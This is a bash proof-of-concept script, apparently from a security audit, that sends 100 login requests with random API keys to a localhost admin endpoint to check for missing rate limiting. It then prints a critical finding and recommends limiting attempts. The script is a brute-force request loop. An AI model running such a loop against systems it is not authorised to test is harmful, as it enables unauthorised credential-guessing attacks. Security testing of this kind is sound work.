#!/bin/bash
# ====================================================
# Proof of Concept: Brute Force Attack on Admin API
# ====================================================
# This demonstrates the lack of rate limiting
# WARNING: For testing purposes only!

TARGET_URL="http://localhost:5555/api/login"
ATTEMPT_COUNT=0
MAX_ATTEMPTS=100

echo "=========================================="
echo "PoC: Brute Force Attack - No Rate Limiting"
echo "=========================================="
echo "Target: $TARGET_URL"
echo "Attempting $MAX_ATTEMPTS login requests..."
echo ""

# Generate test API keys
generate_test_key() {
    # Generate random 64-char hex string
    openssl rand -hex 32
}

start_time=$(date +%s)

for i in $(seq 1 $MAX_ATTEMPTS); do
    TEST_KEY=$(generate_test_key)
    
    # Send login request
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"api_key\":\"$TEST_KEY\"}" 2>/dev/null)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    ATTEMPT_COUNT=$((ATTEMPT_COUNT + 1))
    
    # Check if we got rate limited (would be 429)
    if [ "$HTTP_CODE" = "429" ]; then
        echo "✅ RATE LIMITED after $ATTEMPT_COUNT attempts"
        echo "Response code: $HTTP_CODE"
        end_time=$(date +%s)
        duration=$((end_time - start_time))
        echo "Time elapsed: ${duration}s"
        exit 0
    fi
    
    # Progress indicator
    if [ $((i % 10)) -eq 0 ]; then
        echo "  Attempt $i/$MAX_ATTEMPTS - Status: $HTTP_CODE (No rate limiting detected)"
    fi
done

end_time=$(date +%s)
duration=$((end_time - start_time))

echo ""
echo "❌ VULNERABILITY CONFIRMED"
echo "=========================================="
echo "Completed $ATTEMPT_COUNT attempts in ${duration}s"
echo "Average: $(awk "BEGIN {printf \"%.2f\", $ATTEMPT_COUNT/$duration}") requests/second"
echo ""
echo "Finding: NO RATE LIMITING DETECTED"
echo "Severity: CRITICAL"
echo "Impact: System vulnerable to brute force attacks"
echo "Recommendation: Implement rate limiting (max 5 attempts per 15 minutes)"
echo "=========================================="

